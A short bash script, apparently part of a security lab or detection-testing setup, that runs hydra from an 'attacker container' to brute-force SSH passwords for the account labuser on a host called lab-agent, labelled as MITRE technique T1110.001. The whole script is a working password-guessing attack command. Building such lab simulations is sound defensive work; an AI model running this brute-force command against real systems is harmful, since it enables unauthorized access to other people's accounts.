#!/bin/bash
# Run from the attacker container. T1110.001 Brute Force: Password Guessing against the lab agent's sshd.
set -u
echo "[attacker] guessing passwords for labuser@lab-agent ($(wc -l < /attacks/passwords.txt) candidates)"
hydra -l labuser -P /attacks/passwords.txt -t 4 -I ssh://lab-agent 2>&1 | tail -n 6
